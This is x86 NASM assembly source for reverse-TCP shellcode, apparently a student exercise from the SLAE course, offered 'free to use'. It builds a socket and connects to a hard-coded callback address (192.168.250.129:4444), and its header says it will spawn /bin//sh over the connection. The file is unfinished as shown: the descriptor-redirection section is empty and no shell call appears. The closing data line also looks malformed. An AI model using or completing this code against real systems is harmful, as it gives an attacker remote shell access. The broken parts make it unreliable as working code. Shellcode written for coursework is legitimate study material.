;-------------------------------------------------
; reverse-tcp.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE-744
; August 30, 2016
;
; Free to use and distribute as you see fit
;
; similar to bind-shell-bash.nasm
; but we'll use connect() instead
; and will manipulate file descriptors
; with sockfd and then invoke /bin//sh
;
;------------------------------------------------



global _start

section .text

_start:

	; now we invoke __NR_SOCKETCALL syscall
	; just like we did in our bind shell

	xor eax, eax		; zero out eax
	xor ebx, ebx		; zero out ebx
	push 0x6		; push parameter 3 TCP Protocol
	push 0x1		; push parameter 2 SOCK_STREAM
	push 0x2		; push parameter 1 
	mov al, 0x66		; socketcall syscall
	mov bl, 0x1		; int socket(int domain, int type, int protocol)
	mov ecx, esp		; parameters
	int 0x80		; call it

	mov edi, eax		; save that sockfd


jumper:

	; JMP/CALL/POP for IP and PORT address

	jmp short ip_port


connector:

	; Now we set up the connection with our IP/PORT
	; we'll have to put together the struct again
	; similar to our bind shell
	;
	; int connect(int sockfd, const struct sockaddr *addr,
        ;           socklen_t addrlen)

	pop esi			; store IP and PORT in esi
	xor eax, eax		; clean out eax, remember edi has has sockfd
	push dword [esi]	; IP onto stack
	push word [esi +4]	; PORT onto stack
	mov al, 0x2		; AF_INET IPv4 
	push ax			; struct is set up
	mov eax, esp		; store the pointer to a register temporarily
	push 0x10		; parameter 3 16 bytes in length
	push eax		; parameter 2, pointer to struct
	push edi		; parameter 1, sockfd
	xor eax, eax		; clean out eax again
	mov al, 0x66		; __NR_SOCKETCALL
	xor ebx, ebx		; clean out ebx
	mov bl, 0x3		; connect()
	mov ecx, esp		; pointer to parameters
	int 0x80		; call it, will return 0 on success 

redirect_fd:

	;
	;
	;
	;





ip_port:

	call connector
	remote: db 0x81faa8c0L, 0x5c11	; 192.168.250.129, 4444 see iptohex.py	
